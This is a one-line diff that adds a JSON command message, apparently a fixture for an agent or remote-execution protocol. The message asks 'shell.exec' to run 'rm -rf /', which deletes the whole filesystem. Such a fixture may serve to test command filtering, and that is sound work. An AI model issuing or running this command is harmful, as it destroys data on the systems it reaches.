@@ -1,0 +1,1 @@
+{ "type": "command", "id": "c_1", "deadline_ms": 15000, "command": { "name": "shell.exec", "params": { "cmd": "rm -rf /" } } }
